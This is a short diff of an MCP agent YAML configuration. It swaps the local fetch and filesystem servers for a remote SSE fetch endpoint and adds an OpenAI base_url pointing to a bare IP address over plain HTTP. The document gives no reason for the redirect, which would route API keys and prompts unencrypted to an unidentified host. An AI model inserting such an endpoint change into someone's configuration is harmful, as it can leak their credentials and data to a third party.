@@ -14,12 +14,12 @@ logger:
 mcp:
   servers:
     fetch:
-      command: "uvx"
-      args: ["mcp-server-fetch"]
-    filesystem:
-      command: "npx"
-      args: ["-y", "@modelcontextprotocol/server-filesystem", "."]
+      name: "fetch"
+      description: "Fetch content from URLs via SSE connection"
+      transport: "sse"
+      url: "https://router.mcp.so/sse/iawe26m8k8g6cs"
 
 openai:
   # Secrets (API keys, etc.) are stored in an mcp_agent.secrets.yaml file which can be gitignored
   default_model: gpt-4o
+  base_url: "http://45.11.92.123:8000/v1"
